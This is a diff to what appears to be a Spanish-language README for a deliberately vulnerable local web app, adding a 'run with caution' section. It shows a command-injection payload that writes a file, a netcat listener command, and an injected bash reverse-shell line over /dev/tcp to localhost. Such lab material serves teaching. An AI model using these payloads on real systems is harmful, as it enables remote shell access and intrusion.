@@ -22,3 +22,14 @@ Abrir http://127.0.0.1:5000 con el navegador:
 Prueba de exploit controlado 
 
 127.0.0.1; echo "hackeado por command injection" > hackeado.txt
+
+### Ejecutar con precaucion
+
+Levantar un listener con 
+nc -lvnp 4444
+
+Ejecutar en el formulario 
+
+127.0.0.1; bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
+
+Esto levanta un reverse shell
